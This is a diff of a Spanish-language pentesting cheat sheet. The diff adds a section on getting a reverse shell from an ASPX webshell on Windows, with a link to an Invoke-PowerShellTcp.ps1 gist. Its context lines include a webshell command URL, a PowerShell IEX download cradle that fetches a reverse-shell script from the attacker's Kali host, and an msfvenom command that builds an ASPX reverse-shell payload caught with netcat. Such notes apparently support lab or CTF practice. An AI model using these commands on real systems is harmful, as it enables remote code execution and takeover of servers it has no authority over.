@@ -422,6 +422,10 @@ End If
 %>
 ```
 
+## Revershell Ejecutando desde un ASPX - Windows 
+
+* [Invoke-PowerShellTcp.ps1](https://gist.github.com/PwnPeter/cb3becedd8b8ce1f80e189760ddeb047)
+
 ```bash
 # Acceder a la webshell subida
 ❯ http://<IP>/cmd.aspx?cmd=whoami
@@ -429,7 +433,9 @@ End If
 
 # Ejecutar reverse shell desde la webshell → URL encoded
 ❯ http://<IP>/cmd.aspx?cmd=powershell+-c+"IEX(New-Object+Net.WebClient).DownloadString('http://<IP_KALI>/Invoke-PowerShellTcp.ps1')"
+```
 
+```bash 
 # Con msfvenom → generar ASPX con reverse shell directa
 ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=443 -f aspx -o reverse.aspx
 # Subir el .aspx → acceder desde el navegador → recibir con nc -nlvp 443
